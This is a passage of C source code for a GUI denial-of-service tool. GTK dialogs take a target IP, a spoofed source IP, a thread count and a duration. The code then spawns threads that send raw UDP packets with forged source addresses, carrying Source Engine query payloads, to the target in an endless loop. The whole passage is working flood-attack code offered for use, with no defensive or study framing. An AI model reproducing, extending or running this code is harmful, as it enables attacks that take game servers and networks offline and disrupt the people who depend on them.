    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(threads_dialog)->vbox), get_arg_entry_2, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(time_dialog)->vbox), get_arg_entry_3, TRUE, FALSE, 0);

    gtk_widget_show_all(GTK_DIALOG(IP_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(IP_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            IP = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_1));
            gtk_widget_hide(IP_dialog);
            break;

        default:
            gtk_widget_hide(IP_dialog);
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(Your_IP_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(Your_IP_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            Your_IP = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_4));
            gtk_widget_hide(Your_IP_dialog);
            break;

        default:
            gtk_widget_hide(Your_IP_dialog);
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(threads_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(threads_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            number_threads = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_2));
            gtk_widget_hide(threads_dialog);
            break;

        default:
            gtk_widget_hide(threads_dialog);
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(time_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(time_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            time_duration = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_3));
            //gtk_widget_hide(time_dialog);
            break;

        default:
            gtk_widget_destroy(IP_dialog);
            gtk_widget_destroy(Your_IP_dialog);
            gtk_widget_destroy(threads_dialog);
            gtk_widget_destroy(time_dialog);
            return;
    }

    fprintf(stdout, "Setting up Sockets...\n");

    int num_threads = atoi(number_threads);
    pthread_t thread[num_threads];

    int i;

    for(i = 0; i < num_threads; i++)
    {
        pthread_create( &thread[i], NULL, &flood_vse, (void *)IP);
    }

    wait_time_end(atoi(time_duration));

    gtk_widget_destroy(IP_dialog);
    gtk_widget_destroy(Your_IP_dialog);
    gtk_widget_destroy(threads_dialog);
    gtk_widget_destroy(time_dialog);

    for(i = 0; i < num_threads; i++)
        pthread_cancel(thread[i]);

    gtk_text_buffer_set_text(text_buffer, "Flooding is over ...\n", -1);
    g_print("%s", text);
    g_free(text);

    /* unused parameters */
    (void)button;
    (void)user_data;

    return;
}


void setup_udp_header_vse(struct udphdr *udph)
{
    udph->source = htons(27015);
    udph->dest = htons(27015);
    udph->check = 0;

    void *data = (void *)udph + sizeof(struct udphdr);
    memset(data, 0xFF, 4);
    strcpy(data+4, "TSource Engine Query");

    udph->len = htons(sizeof(struct udphdr) + 25);
}

void setup_ip_header_vse(struct iphdr *iph)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 25;
        iph->id = htonl(54321);
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;
        iph->saddr = inet_addr(Your_IP);
}


void *flood_vse(void *par1)
{
    char *td = (char *)par1;
    char datagram[MAX_PACKET_SIZE];

    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(17015);
    sin.sin_addr.s_addr = inet_addr(td);

    int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if(s < 0)
    {
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
    }

    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header_vse(iph);
    setup_udp_header_vse(udph);

    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum ((unsigned short *) datagram, iph->tot_len);

    int tmp = 1;
    const int *val = &tmp;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0)
    {
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }

    init_rand(time(NULL));

    while(1)
    {
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    }
}

